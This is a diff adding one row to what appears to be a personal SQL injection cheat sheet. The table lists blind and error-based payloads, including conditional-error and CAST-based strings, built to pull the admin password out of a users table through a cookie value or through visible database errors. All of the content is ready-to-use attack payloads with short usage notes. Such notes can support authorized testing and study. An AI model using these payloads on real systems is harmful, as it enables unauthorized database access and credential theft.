@@ -70,3 +70,4 @@
 | **Blind SQL Injection** |
 | `cookie_value' and substring((select password from users where username='admin'),1,1)='a'--'` | Blind sql injection on error based injection (ie, we have a response changing when an error occurs or not) |
 | `LGF4OY5pSrLIqxu' and (SELECT CASE WHEN (SUBSTR(password,1,21)='gz92x9yvfj3m6rzre8zg§a§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--` | Conditionnal error. Ie when a good value is set, an error is thrown (ex : 500 Internal server Error) |
+| `' AND CAST((SELECT password FROM users WHERE username='admin') AS int)--` `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` | Can be usefull when error query are shown. |
